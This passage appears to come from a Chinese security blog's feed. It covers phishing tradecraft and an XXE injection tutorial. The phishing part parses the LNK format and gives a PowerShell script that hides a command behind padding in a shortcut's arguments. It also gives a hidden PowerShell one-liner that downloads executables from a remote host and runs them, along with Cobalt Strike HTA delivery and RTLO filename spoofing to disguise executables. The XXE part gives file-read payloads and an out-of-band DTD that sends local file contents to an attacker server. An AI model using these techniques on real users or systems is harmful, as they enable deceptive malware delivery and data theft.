href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_3b9c7b80-c157-438a-b53a-dbe935ec3243">link target</a> that is a 16-bit application.</td></tr><tr><td align="left">L  <code>Unused1</code></td><td align="left">A bit that is undefined and MUST be ignored.</td></tr><tr><td align="left">M  <code>HasDarwinID</code></td><td align="left">The shell link is saved with a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/48f8a4c4-99fe-4787-a39f-b1367103eba8">DarwinDataBlock (section 2.5.3)</a>.</td></tr><tr><td align="left">N  <code>RunAsUser</code></td><td align="left">The application is run as a different user when the target of the shell link is activated.</td></tr><tr><td align="left">O<code>HasExpIcon</code></td><td align="left">The shell link is saved with an <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/9e6b7dfe-2ca2-4875-a0c9-8d75ee4f9b65">IconEnvironmentDataBlock (section 2.5.5)</a>.</td></tr><tr><td align="left">P  <code>NoPidlAlias</code></td><td align="left">The file system location is represented in the shell <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_165fda5c-ed85-42c2-bd8c-1bbbde70cee9">namespace</a> when the path to an item is parsed into an IDList.</td></tr><tr><td align="left">Q  <code>Unused2</code></td><td align="left">A bit that is undefined and MUST be ignored.</td></tr><tr><td align="left">R  <code>RunWithShimLayer</code></td><td align="left">The shell link is saved with a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/bde812e5-5af0-4db9-a7e3-4a46e91c873a">ShimDataBlock (section 2.5.8)</a>.</td></tr><tr><td align="left">S  <code>ForceNoLinkTrack</code></td><td align="left">The <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/df8e3748-fba5-4524-968a-f72be06d71fc">TrackerDataBlock (section 2.5.10)</a> is ignored.</td></tr><tr><td align="left">T  <code>EnableTargetMetadata</code></td><td align="left">The shell link attempts to collect target properties and store them in the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/36463387-0708-40f6-a3a5-452fe42be585">PropertyStoreDataBlock (section 2.5.7)</a> when the link target is set.</td></tr><tr><td align="left">U  <code>DisableLinkPathTracking</code></td><td align="left">The EnvironmentVariableDataBlock is ignored.</td></tr><tr><td align="left">V  <code>DisableKnownFolderTracking</code></td><td align="left">The <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/8833199d-fc03-4535-8011-ba36c4b3ad5f">SpecialFolderDataBlock (section 2.5.9)</a> and the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/5c7410e4-ec19-4ec5-8fff-cf4ccc46c5b6">KnownFolderDataBlock (section 2.5.6)</a> are ignored when loading the shell link. If this bit is set, these extra data blocks SHOULD NOT be saved when saving the shell link.</td></tr><tr><td align="left">W  <code>DisableKnownFolderAlias</code></td><td align="left">If the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_6cfb1417-9127-43fa-ad5b-1ddcc3d270a5">link</a> has a KnownFolderDataBlock (section 2.5.6), the unaliased form of the known folder IDList SHOULD be used when translating the target IDList at the time that the link is loaded.</td></tr><tr><td align="left">X  <code>AllowLinkToLink</code></td><td align="left">Creating a link that references another link is enabled. Otherwise, specifying a link as the target IDList SHOULD NOT be allowed.</td></tr><tr><td align="left">Y  <code>UnaliasOnSave</code></td><td align="left">When saving a link for which the target IDList is under a known folder, either the unaliased form of that known folder or the target IDList SHOULD be used.</td></tr><tr><td align="left">Z  <code>PreferEnvironmentPath</code></td><td align="left">The target IDList SHOULD NOT be stored; instead, the path specified in the EnvironmentVariableDataBlock (section 2.5.4) SHOULD be used to refer to the target.</td></tr><tr><td align="left">AA  <code>KeepLocalIDListForUNCTarget</code></td><td align="left">When the target is a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ac7b5968-68f5-4e5c-8b11-00a6f4ae98ff#gt_c9507dca-291d-4fd6-9cba-a9ee7da8c908">UNC</a> name that refers to a location on a local machine, the local path IDList in the PropertyStoreDataBlock (section 2.5.7) SHOULD be stored, so it can be used when the link is loaded on the local machine.</td></tr></tbody></table><p>可以在<strong>010 Editor</strong>中看到，1表示设置的，0表示未设置的</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/27.png" alt="image-20200813170527371"></p><h4 id="FileAttributes"><a href="#FileAttributes" class="headerlink" title="FileAttributes"></a>FileAttributes</h4><p>由<code>offset 0x18</code>起始<code>4</code>字节为<strong>FileAttributes</strong> <code> 0x00000020</code>表示<strong>FILE_ATTRIBUTE_ARCHIVE</strong></p><h4 id="CreateTime-amp-AccessTime-amp-WriteTime"><a href="#CreateTime-amp-AccessTime-amp-WriteTime" class="headerlink" title="CreateTime &amp; AccessTime &amp; WriteTime"></a>CreateTime &amp; AccessTime &amp; WriteTime</h4><p>由<code>offset 0x1C</code>开始，每个字段各占<code>8</code>字节：</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/28.png" alt="image-20200813170742853"></p><h4 id="FileSize"><a href="#FileSize" class="headerlink" title="FileSize"></a>FileSize</h4><p>由<code>offset 0x34</code>起始<strong>FileSize</strong>为<code>0x000C0B10</code>(占<code>4</code>个字节)</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/29.png" alt="image-20200813171033900"></p><h4 id="IconIndex"><a href="#IconIndex" class="headerlink" title="IconIndex"></a>IconIndex</h4><p><strong>IconIndex</strong>为<code>0x00000000</code>(占<code>4</code>个字节)。</p><h4 id="ShowCommand-amp-Hotkey"><a href="#ShowCommand-amp-Hotkey" class="headerlink" title="ShowCommand &amp; Hotkey"></a>ShowCommand &amp; Hotkey</h4><p>由<code>offset 0x3C</code>开始，<strong>ShowCommand</strong>占<code>4</code>字节，<strong>0x00000001</strong>表示<code>SW_SHOWNORMAL</code>,当然也可以根据具体的需要替换为<code>SW_SHOWMAXIMIZED (0x00000003)</code>(<strong>窗口最大化</strong>)以及<code>SW_SHOWMINNOACTIVE (0x00000007)</code>(<strong>窗口最小化</strong>)</p><p><strong>Hotkey</strong>占<code>2</code>字节；余下<code>10</code>个字节均为保留位。</p><h4 id="LinkTargetIDList"><a href="#LinkTargetIDList" class="headerlink" title="LinkTargetIDList"></a>LinkTargetIDList</h4><p>由<code>offset 0x4C</code>开始，两个字节表示大小，这个位置就是一个一个文件夹拼接起来的一个完整路径，这边测试的完整路径**”C:\Program Files (x86)\Huorong\Sysdiag\bin\HipsMain.exe”**</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/30.png" alt="image-20200813172205813"></p><p>第一个ItemID为CLSID_MyComputer</p><p>第二个ItemID,其含义为<strong>c:</strong></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/31.png" alt="image-20200813172621938"></p><p>第三个ItemID,第二层级路径</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/32.png" alt="image-20200813172831624"></p><p>第四个ItemID-第6个ItemID</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/33.png" alt="image-20200813173247917"></p><h4 id="LinkInfo"><a href="#LinkInfo" class="headerlink" title="LinkInfo"></a>LinkInfo</h4><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/34.png" alt="image-20200813173515708"></p><h4 id="String-Data"><a href="#String-Data" class="headerlink" title="String Data"></a>String Data</h4><p>StringData WORKING_DIR这个字段是起始位置的值</p><p>StringData ICON_LOCATION这个字段是图标位置的值</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/35.png" alt="image-20200813173754425"></p><h4 id="EXTRA-DATA"><a href="#EXTRA-DATA" class="headerlink" title="EXTRA_DATA"></a>EXTRA_DATA</h4><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/36.png" alt="EXTRA_DATA"></p><blockquote><p>这边记个小TOP</p></blockquote><ul><li><p>目标文件位置所能显示最大字符串为260个，所有我们可以把执行的命令放在260个字符后面，具体生成PS脚本如下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="built_in">Get-Content</span> <span class="string">&quot;.\test.txt&quot;</span></span><br><span class="line"><span class="variable">$WshShell</span> = <span class="built_in">New-Object</span> <span class="literal">-comObject</span> WScript.Shell</span><br><span class="line"><span class="variable">$Shortcut</span> = <span class="variable">$WshShell</span>.CreateShortcut(<span class="string">&quot;test.lnk&quot;</span>)</span><br><span class="line"><span class="variable">$Shortcut</span>.TargetPath = <span class="string">&quot;%SystemRoot%\system32\cmd.exe&quot;</span></span><br><span class="line"><span class="variable">$Shortcut</span>.IconLocation = <span class="string">&quot;%SystemRoot%\System32\Shell32.dll,21&quot;</span></span><br><span class="line"><span class="variable">$Shortcut</span>.Arguments = <span class="string">&#x27;                                                                                                                                                                                                                                      &#x27;</span>+ <span class="variable">$file</span></span><br><span class="line"><span class="variable">$Shortcut</span>.Save()</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/37.png" alt="image-20200814175119204"></p></li><li><p>我们可以在执行完shell后再从服务器上下载个伪装文件，并且打开他，用来迷惑目标（比如你做的钓鱼文件是PDF的那你就下载个PDF正常的打开他），这边测试下载两个文件，一个是CMD一个powershell（下面的代码是上面所说的test.txt中的代码）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/c powershell <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).DownloadFile(&#x27;http://192.168.0.126:8000/cmd.exe&#x27;,&#x27;1.exe&#x27;))&quot;</span>;&amp;powershell <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).DownloadFile(&#x27;http://192.168.0.126:8000/powershell.exe&#x27;,&#x27;2.exe&#x27;))&quot;</span> ;&amp;powershell <span class="built_in">start-process</span> <span class="string">&#x27;.\1.exe&#x27;</span>;&amp;powershell <span class="built_in">start-process</span> <span class="string">&#x27;.\2.exe&#x27;</span></span><br></pre></td></tr></table></figure><p>最终效果如下</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/38.gif" alt="2"></p></li></ul><h2 id="HTA钓鱼"><a href="#HTA钓鱼" class="headerlink" title="HTA钓鱼"></a>HTA钓鱼</h2><p>HTA是HTML Application的缩写，直接将HTML保存成HTA的格式，是一个独立的应用软件。<br>HTA虽然用HTML、JS和CSS编写，却比普通网页权限大得多，它具有桌面程序的所有权限。<br>就是一个html应用程序，双击就能运行。</p><p>Cobalt Strike生成方式：attacks——&gt;packages——&gt;HTML application</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/19.png" alt="image-20200812182253747"></p><p>点击生成后把.hta文件发送给目标，目标运行后就可以看到机器上线了</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/20.png" alt="image-20200812182638955"></p><h2 id="文件后缀RTLO"><a href="#文件后缀RTLO" class="headerlink" title="文件后缀RTLO"></a>文件后缀RTLO</h2><p>伪装文件中有个比较古老的方式，但依然会在攻击中看到它的身影。RTLO字符全名为“RIGHT-TO-LEFT OVERRIDE”，是一个不可显示的控制类字符，其本质是unicode 字符。可以将任意语言的文字内容按倒序排列，最初是用来支持一些从右往左写的语言的文字，比如阿拉伯语，希伯来语。由于它可以重新排列字符的特性，会被攻击者利用从而达到欺骗目标，使得用户运行某些具有危害性的可执行文件。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>制作方式就是这样的，他会让字符串倒着编码</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/21.png" alt="image-20200813105304237"></p><h3 id="简单的生成"><a href="#简单的生成" class="headerlink" title="简单的生成"></a>简单的生成</h3><p>用Python一键生成用，把txt改为png后缀</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.rename(<span class="string">&#x27;ascotbe.txt&#x27;</span>, <span class="string">&#x27;ascotbe-\u202egnp.txt&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/22.png" alt="image-20200813110156755"></p><p>可以看到我们吧<strong>ascotbe.txt</strong>改成了<strong>ascotbe-txt.png</strong>并且还是个文本文档类型</p><h3 id="生成钓鱼文件"><a href="#生成钓鱼文件" class="headerlink" title="生成钓鱼文件"></a>生成钓鱼文件</h3><p>如果是exe文件的话可以替换图标，来进行迷惑行为，我们先生成一个魅惑名字的文件</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/23.png" alt="image-20200813111611299"></p><p>运行python脚本</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/24.png" alt="image-20200813111646139"></p><p>然后我们用Resource Hacker替换图标</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/25.png" alt="image-20200813114403776"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;bhdresh&#x2F;CVE-2017-0199</span><br><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;850d1363abc5</span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MzAwMzYxNzc1OA&#x3D;&#x3D;&amp;mid&#x3D;2247485861&amp;idx&#x3D;1&amp;sn&#x3D;a4b87208c753c317240c7ae063871cdb&amp;chksm&#x3D;9b392f14ac4ea60240ca3c84f39f65a3b5584a08dbcf07b6962c3464ae282c3a1003fa3de37a&amp;scene&#x3D;126&amp;sessionid&#x3D;1596119031&amp;key&#x3D;25e1725a9070fca2a709c8a9cb837164ccd0b43058ae37339d865f113689c2ed541a337af3977dc16e95d85b32d7227c74f6df7e543f6d7634aced40e7cca665ce2895f15fe993763124fd2fa7c10091&amp;ascene&#x3D;1&amp;uin&#x3D;MTAzNzIzNDc2MQ%3D%3D&amp;devicetype&#x3D;Windows+10+x64&amp;version&#x3D;62090529&amp;lang&#x3D;zh_CN&amp;exportkey&#x3D;Aeo1t2sb2ZHnz3Nz8kzqLmw%3D&amp;pass_ticket&#x3D;DQWeM2sy7zmodhMi%2BT8fLsw34y3Tz9aBp44VMrGf14Nmcl7qS6hcq5YMCuQUdGSU</span><br><span class="line">http:&#x2F;&#x2F;zijieke.com&#x2F;d&#x2F;172</span><br><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;openspecs&#x2F;windows_protocols&#x2F;ms-shllink&#x2F;c3376b21-0931-45e4-b2fc-a48ac0e60d15</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XXE的一些利用方式</title>
    <link href="https://www.ascotbe.com/2020/07/24/XXE/"/>
    <id>https://www.ascotbe.com/2020/07/24/XXE/</id>
    <published>2020-07-24T13:45:42.000Z</published>
    <updated>2021-05-17T00:32:35.016Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>对没错这是这星期的第四篇文章了，我感觉要肝不动了啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/12.png" alt="image-20200729093326798" style="zoom:50%;" /><h3 id="XXE是什么"><a href="#XXE是什么" class="headerlink" title="XXE是什么"></a>XXE是什么</h3><p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是什么？XML外部实体。(看到这里肯定有人要说：你这不是在废话)，固然，其实我这里废话只是想强调我们的利用点是 <strong>外部实体</strong> ，也是提醒读者将注意力集中于外部实体中，而不要被 XML 中其他的一些名字相似的东西扰乱了思维(<strong>盯好外部实体就行了</strong>)，如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面（这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到）</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/1.png" alt="img"></p><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>XML是一种用于标记电子文件使其具有结构性的标记语言，用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><p>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的，他就是长得下面这个样子</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&#x2F;&#x2F;这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><p>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;message&gt;</span><br><span class="line">&lt;receiver&gt;Myself&lt;&#x2F;receiver&gt;</span><br><span class="line">&lt;sender&gt;Someone&lt;&#x2F;sender&gt;</span><br><span class="line">&lt;header&gt;TheReminder&lt;&#x2F;header&gt;</span><br><span class="line">&lt;msg&gt;This is an amazing book&lt;&#x2F;msg&gt;</span><br><span class="line">&lt;&#x2F;message&gt;</span><br></pre></td></tr></table></figure><p>其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 ML 中除了能标签以外，还需要有些内容是固定的</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</span><br></pre></td></tr></table></figure><p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure><p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p><h3 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h3><p><strong>重点一：</strong></p><p>实体分为两种，内部实体和<strong>外部实体</strong>，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">    &lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure><p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（<strong>方便永远是安全的敌人</strong>）</p><p>当然，还有一种引用方式是使用 引用<strong>公用 DTD</strong> 的方法，语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure><p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p><p><strong>重点二：</strong></p><p>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体），别晕。。</p><p><strong>1.通用实体</strong></p><p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;&#x2F;firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;&#x2F;lastname&gt;  </span><br><span class="line">    ... </span><br><span class="line">&lt;&#x2F;updateProfile&gt;</span><br></pre></td></tr></table></figure><p><strong>2.参数实体：</strong></p><p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;somewhere.example.org&#x2F;remote.dtd&quot;&gt; </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure><h3 id="XXE攻击手段汇总"><a href="#XXE攻击手段汇总" class="headerlink" title="XXE攻击手段汇总"></a>XXE攻击手段汇总</h3><p>首先复现需要用到的项目地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;xxe-lab</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/2.png" alt="image-20200724095320602"></p><p>首先搭建好环境后我们尝试抓包</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/3.png" alt="image-20200724095301738"></p><p>可以看到类似标签页信息，如果没有下面的请求头的话可以添加这个头，这样可以让服务器试着解析XML格式，这边是直接存在这个请求头，就不需要添加了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept: application&#x2F;xml, text&#x2F;xml, *&#x2F;*;</span><br></pre></td></tr></table></figure><p>然后在POS包里面添加XML文档，需要使用<code>&amp;xxe;</code>来引用上面的XXE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe &quot;ascotbe&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/4.png" alt="image-20200724100320554"></p><h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><h5 id="有回显方法"><a href="#有回显方法" class="headerlink" title="有回显方法"></a>有回显方法</h5><p>使用以下POC即可读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;Windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/5.png" alt="image-20200724100524209"></p><h5 id="无回显方法"><a href="#无回显方法" class="headerlink" title="无回显方法"></a>无回显方法</h5><p>如果直接执行的话是没有任何回显的。可以使用http协议将请求发送到远程服务器上，从而获取文件内容。</p><p>首先在远程服务器写入一个<code>test.dtd</code>文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all </span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.0.161:8000&#x2F;?%file;&#39;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p>然后在目标机器上发送payload来加载它</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;c:&#x2F;Windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.161:8000&#x2F;test.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/XXE/6.png" 